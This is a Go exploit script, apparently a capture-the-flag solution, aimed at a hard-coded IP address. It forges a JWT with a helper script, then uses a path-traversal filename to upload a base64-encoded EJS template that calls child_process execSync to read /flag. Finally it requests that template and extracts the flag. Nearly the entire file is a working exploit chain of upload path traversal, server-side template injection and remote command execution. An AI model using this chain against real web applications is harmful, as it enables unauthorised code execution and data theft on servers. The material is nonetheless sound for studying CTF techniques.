package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os/exec"
	"regexp"
)

var TARGET = "http://60.205.163.215:24671"
var re = regexp.MustCompile(`(n1ctf\{[a-f0-9-]+\})`)

func main() {
	ejsTemplate := `<%= global.process.mainModule.require('child_process').execSync('cat /flag').toString() %>`

	filedata := base64.StdEncoding.EncodeToString([]byte(ejsTemplate))

	filename := "../views/flag.ejs/."

	jwt_cmd := exec.Command("node", "craft_jwt.js")
	jwt_output, _ := jwt_cmd.CombinedOutput()
	jwt := string(bytes.TrimSpace(jwt_output))

	fmt.Printf("Using JWT: %s\n", jwt)

	payload := fmt.Sprintf(`{"filename":"%s","filedata":"%s"}`, filename, filedata)

	cmd := exec.Command("curl",
		"-X", "POST",
		TARGET+"/upload",
		"-H", "Content-Type: application/json",
		"-H", fmt.Sprintf("Cookie: token=%s", jwt),
		"--data-binary", "@-",
	)

	cmd.Stdin = bytes.NewBufferString(payload)
	output, _ := cmd.CombinedOutput()

	if !bytes.Contains(output, []byte("Denied")) {
		fmt.Printf("upload done\n")
	} else {
		fmt.Printf("failed")
	}

	cmd = exec.Command("curl",
		TARGET+"/?templ=flag.ejs",
	)
	output, _ = cmd.CombinedOutput()

	matches := re.FindAllStringSubmatch(string(output), -1)

	for _, match := range matches {
		fmt.Printf("Flag: %s\n", match[1])
	}
}
